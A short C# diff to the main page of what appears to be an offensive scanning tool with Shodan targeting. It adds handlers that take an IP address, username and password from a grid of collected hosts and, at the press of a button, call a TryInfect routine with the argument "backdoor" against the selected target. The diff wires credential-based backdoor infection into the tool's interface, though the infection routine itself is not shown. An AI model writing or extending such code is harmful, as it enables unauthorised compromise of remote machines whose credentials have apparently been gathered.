@@ -21,7 +21,6 @@ public partial class MainPage : Page, INotifyPropertyChanged, INavigationAware
     #region locals
 
     public ScanHelper helperObject { get; set; }
-    private readonly IScanResultService _scanResults;
     internal static bool ShodanScan = false;
     internal static string _targetingString = "";
     public ObservableCollection<ScanResult> Source { get; } = new();
@@ -308,5 +307,25 @@ public partial class MainPage : Page, INotifyPropertyChanged, INavigationAware
         {
             helperObject.Stop();
         }
+    }
+
+    private static User userForBtw;
+    private static string targetForBTW = "";
+    private void userGrid_SelectedCellsChanged(object sender, SelectedCellsChangedEventArgs e)
+    {
+        if (userGrid.CurrentItem != null)
+        {
+            CollectionListing selectedItem = (CollectionListing)userGrid.CurrentItem;
+            if (selectedItem != null)
+            {
+                targetForBTW = selectedItem.IPAddress;
+                userForBtw = new User(selectedItem.Username, selectedItem.Password);
+            }
+        }
+    }
+
+    private void AttemptBTW(object sender, System.Windows.RoutedEventArgs e)
+    {
+        helperObject.TryInfect(targetForBTW, userForBtw, "backdoor");
     }
 }
